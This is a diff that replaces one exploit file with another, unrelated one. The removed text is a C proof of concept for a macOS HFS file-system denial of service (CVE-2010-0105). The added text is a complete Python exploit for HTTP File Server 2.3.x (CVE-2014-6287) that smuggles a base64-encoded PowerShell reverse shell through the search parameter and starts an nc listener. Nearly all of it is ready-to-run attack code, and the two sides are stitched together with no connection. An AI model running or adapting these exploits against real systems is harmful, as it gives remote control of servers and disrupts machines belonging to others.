@@ -1,119 +1,50 @@
-// -----BEGIN PGP SIGNED MESSAGE-----
-// Hash: SHA1
-/* 	Proof of Concept for CVE-2010-0105
-	MacOS X 10.6 hfs file system attack (Denial of Service)
-	by Maksymilian Arciemowicz from SecurityReason.com
+# Exploit Title: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
+# Google Dork: intext:"httpfileserver 2.3"
+# Date: 20/02/2021
+# Exploit Author: Pergyz
+# Vendor Homepage: http://www.rejetto.com/hfs/
+# Software Link: https://sourceforge.net/projects/hfs/
+# Version: 2.3.x
+# Tested on: Microsoft Windows Server 2012 R2 Standard
+# CVE : CVE-2014-6287
+# Reference: https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands
 
-	http://securityreason.com/achievement_exploitalert/15
+#!/usr/bin/python3
 
-	NOTE:
+import base64
+import os
+import urllib.request
+import urllib.parse
 
-	This DoS will be localized in phase
+lhost = "10.10.10.1"
+lport = 1111
+rhost = "10.10.10.8"
+rport = 80
 
-	Checking multi-linked directories
+# Define the command to be written to a file
+command = f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()'
 
-	So we need activate it with line
+# Encode the command in base64 format
+encoded_command = base64.b64encode(command.encode("utf-16le")).decode()
+print("\nEncoded the command in base64 format...")
 
-		connlink("C/C","CX");
+# Define the payload to be included in the URL
+payload = f'exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}'
 
-	Now we need create PATH_MAX/2 directory tree to make overflow.
+# Encode the payload and send a HTTP GET request
+encoded_payload = urllib.parse.quote_plus(payload)
+url = f'http://{rhost}:{rport}/?search=%00{{.{encoded_payload}.}}'
+urllib.request.urlopen(url)
+print("\nEncoded the payload and sent a HTTP GET request to the target...")
 
-	and we should get diskutil and fsck_hfs exit with sig=8
+# Print some information
+print("\nPrinting some information for debugging...")
+print("lhost: ", lhost)
+print("lport: ", lport)
+print("rhost: ", rhost)
+print("rport: ", rport)
+print("payload: ", payload)
 
-	~ x$ diskutil verifyVolume /Volumes/max2
-	Started filesystem verification on disk0s3 max2
-	Performing live verification
-	Checking Journaled HFS Plus volume
-	Checking extents overflow file
-	Checking catalog file
-	Checking multi-linked files
-	Checking catalog hierarchy
-	Checking extended attributes file
-	Checking multi-linked directories
-	Maximum nesting of folders and directory hard links reached
-	The volume max2 could not be verified completely
-	Error: -9957: Filesystem verify or repair failed
-	Underlying error: 8: POSIX reports: Exec format error
-
-
-*/
-#include <stdio.h>
-#include <unistd.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/param.h>
-#include <sys/stat.h>
-#include <sys/types.h>
-
-
-int createdir(char *name){
-	if(0!=mkdir(name,((S_IRWXU | S_IRWXG | S_IRWXO) & ~umask(0))| S_IWUSR
-|S_IXUSR)){
-		printf("Can`t create %s", name);
-		exit(1);}
-		else
-		return 0;
-}
-
-int comein(char *name){
-	if(0!=chdir(name)){
-		printf("Can`t chdir in to %s", name);
-		exit(1);}
-		else
-		return 0;
-}
-
-int connlink(a,b)
-char *a,*b;
-{
-	if(0!=link(a,b)){
-		printf("Can`t create link %s => %s",a,b);
-		exit(1);}
-		else
-		return 0;
-}
-
-int main(int argc,char *argv[]){
-
- 	int level;
-	FILE *fp;
-
-	if(argc==2) {
-		level=atoi(argv[1]);
-	}else{
-		level=512; //default
-	}
-	createdir("C"); //create hardlink
-	createdir("C/C"); //create hardlink
-
-	connlink("C/C","CX"); //we need use to checking multi-linked directorie
-
-	comein("C");
-
-	while(level--)
-			printf("Level: %i mkdir:%i chdir:%i\n",level,
-			createdir("C"),
-			comein("C"));
-
-
-	printf("check diskutil verifyVolume /\n");
-	return 0;
-}
-/*
-- --
-Best Regards,
-- ------------------------
-pub   1024D/A6986BD6 2008-08-22
-uid                  Maksymilian Arciemowicz (cxib)
-<cxib@securityreason.com>
-sub   4096g/0889FA9A 2008-08-22
-
-http://securityreason.com
-http://securityreason.com/key/Arciemowicz.Maksymilian.gpg
------BEGIN PGP SIGNATURE-----
-
-iEYEARECAAYFAkvTTQsACgkQpiCeOKaYa9bHwACfSRqy8xJbJBGFvLbLIjabxMkI
-to4AoMMetii9Gc7EyOK7/3+QP4ynP5kY
-=IML/
------END PGP SIGNATURE-----
-*/
+# Listen for connections
+print("\nListening for connection...")
+os.system(f'nc -nlvp {lport}')
